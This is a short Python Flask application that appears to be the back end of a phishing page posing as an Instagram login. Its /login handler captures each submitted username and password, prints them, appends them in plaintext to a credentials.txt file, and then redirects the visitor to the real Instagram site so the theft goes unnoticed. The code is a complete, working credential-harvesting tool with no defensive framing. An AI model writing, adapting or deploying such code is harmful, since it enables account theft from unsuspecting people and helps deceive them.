from flask import Flask, render_template, request, redirect

app = Flask(__name__, static_folder='static', template_folder='templates')


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f'Username: {username}\nPassword: {password}')
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}\nPassword: {password} \n\n')
    return redirect("https://www.instagram.com/")


if __name__ == '__main__':
    app.run(debug=True)


